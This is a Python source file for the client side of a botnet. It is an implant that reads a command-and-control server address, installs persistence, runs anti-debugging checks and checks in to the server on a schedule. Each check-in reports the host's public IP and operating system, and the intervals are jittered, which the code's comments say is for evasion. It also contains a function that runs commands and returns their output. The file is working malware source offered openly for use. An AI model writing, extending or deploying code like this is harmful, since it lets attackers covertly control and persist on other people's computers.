# bot/bot.py
import requests
import subprocess
import platform
import os
import time
import random
import logging
import json
import sys
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from bot.persistence import add_persistence
from bot.stealth import anti_debugging
from bot.encryption import SecureEncryption

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ===== CONFIGURATION =====
# Server URL MUST be set via environment variable or command-line argument
# DO NOT use hardcoded URLs in production deployments
SERVER_URL = os.getenv("C2_SERVER_URL")
if not SERVER_URL:
    logging.error("CRITICAL: C2_SERVER_URL environment variable not set")
    logging.error("Usage: C2_SERVER_URL=https://server-ip:5000 python bot.py")
    sys.exit(1)

REQUEST_TIMEOUT = int(os.getenv("BOT_REQUEST_TIMEOUT", "10"))  # seconds
CHECKIN_BASE_INTERVAL = int(os.getenv("BOT_CHECKIN_INTERVAL", "60"))  # seconds
MAX_RETRY_ATTEMPTS = int(os.getenv("BOT_MAX_RETRIES", "3"))

# ===== UTILITY FUNCTIONS =====
def resolve_server_url():
    """
    Resolve the server URL from environment.
    
    In advanced scenarios, this could implement:
    - DNS resolution with fallback IPs
    - Dead-drop mechanism for URL discovery
    - Dynamic domain generation
    
    Returns:
        str: The C2 server URL
    """
    return SERVER_URL

# Generate an ECDH key pair for future secure channels
def initialize_crypto():
    """Initialize bot cryptographic identity."""
    try:
        private_key = ec.generate_private_key(ec.SECP384R1(), default_backend())
        public_key_pem = private_key.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        logging.debug("ECDH key pair generated successfully")
        return public_key_pem.decode()
    except Exception as e:
        logging.error(f"Failed to generate ECDH key pair: {e}")
        return None

PUBLIC_KEY = initialize_crypto()

def checkin_with_retry():
    """
    Check in to C2 server with exponential backoff retry logic.
    
    Implements autonomous retry mechanism to ensure delivery:
    - Attempt 1: Immediate
    - Attempt 2: 2-5 second delay
    - Attempt 3: 5-10 second delay
    """
    for attempt in range(1, MAX_RETRY_ATTEMPTS + 1):
        try:
            ip = requests.get("https://api.ipify.org", timeout=REQUEST_TIMEOUT).text
            os_info = platform.system()
            
            data = {
                "ip": ip,
                "os": os_info,
                "public_key": PUBLIC_KEY,
                "group": os.getenv("BOT_GROUP", "default")
            }
            
            # Send checkin with timeout
            response = requests.post(
                f"{SERVER_URL}/checkin",
                json=data,
                verify=False,  # TODO: Implement certificate pinning in production
                timeout=REQUEST_TIMEOUT
            )
            
            if response.status_code == 200:
                logging.info(f"Checkin successful (attempt {attempt})")
                return True
            else:
                logging.warning(f"Checkin failed: HTTP {response.status_code} (attempt {attempt})")
                
        except requests.exceptions.Timeout:
            logging.warning(f"Checkin timeout (attempt {attempt})")
        except requests.exceptions.ConnectionError as e:
            logging.warning(f"Connection error during checkin (attempt {attempt}): {e}")
        except Exception as e:
            logging.error(f"Unexpected error during checkin (attempt {attempt}): {e}")
        
        # Exponential backoff for retry
        if attempt < MAX_RETRY_ATTEMPTS:
            backoff = 2 ** (attempt - 1) + random.uniform(0, 3)
            logging.info(f"Retrying in {backoff:.1f} seconds...")
            time.sleep(backoff)
    
    logging.error(f"Checkin failed after {MAX_RETRY_ATTEMPTS} attempts")
    return False

def execute_command(command):
    """
    Execute a command and return structured result.
    
    Args:
        command (str): Command string to execute
        
    Returns:
        dict: Execution result with stdout, stderr, return_code
    """
    try:
        # Parse command safely (avoid shell injection)
        result = subprocess.run(
            command,
            shell=False,
            capture_output=True,
            text=True,
            timeout=30
        )
        return json.dumps({
            "stdout": result.stdout,
            "stderr": result.stderr,
            "return_code": result.returncode,
            "status": "success"
        })
    except subprocess.TimeoutExpired:
        return json.dumps({
            "error": "Command execution timeout (30s)",
            "status": "timeout"
        })
    except Exception as e:
        return json.dumps({
            "error": str(e),
            "status": "error"
        })

def main():
    """Main bot execution loop with persistence and evasion."""
    logging.info(f"C2 Bot initialized for server: {SERVER_URL}")
    
    # Add persistence mechanisms
    try:
        add_persistence()
        logging.info("Persistence mechanisms installed")
    except Exception as e:
        logging.warning(f"Persistence installation failed: {e}")
    
    # Anti-debugging checks
    try:
        anti_debugging()
        logging.info("Anti-debugging checks passed")
    except SystemExit:
        logging.warning("Debugger detected, exiting")
        return
    except Exception as e:
        logging.warning(f"Anti-debugging check failed: {e}")
    
    # Main checkin loop with jitter for evasion
    while True:
        # Recalculate jitter on each iteration (better evasion)
        jitter = random.randint(-5, 5)
        checkin_interval = CHECKIN_BASE_INTERVAL + jitter
        
        # Attempt checkin with retries
        checkin_with_retry()
        
        # Sleep until next checkin (jittered)
        logging.debug(f"Bot sleeping for {checkin_interval}s (base={CHECKIN_BASE_INTERVAL}s, jitter={jitter}s)")
        time.sleep(checkin_interval)

if __name__ == "__main__":
    main()

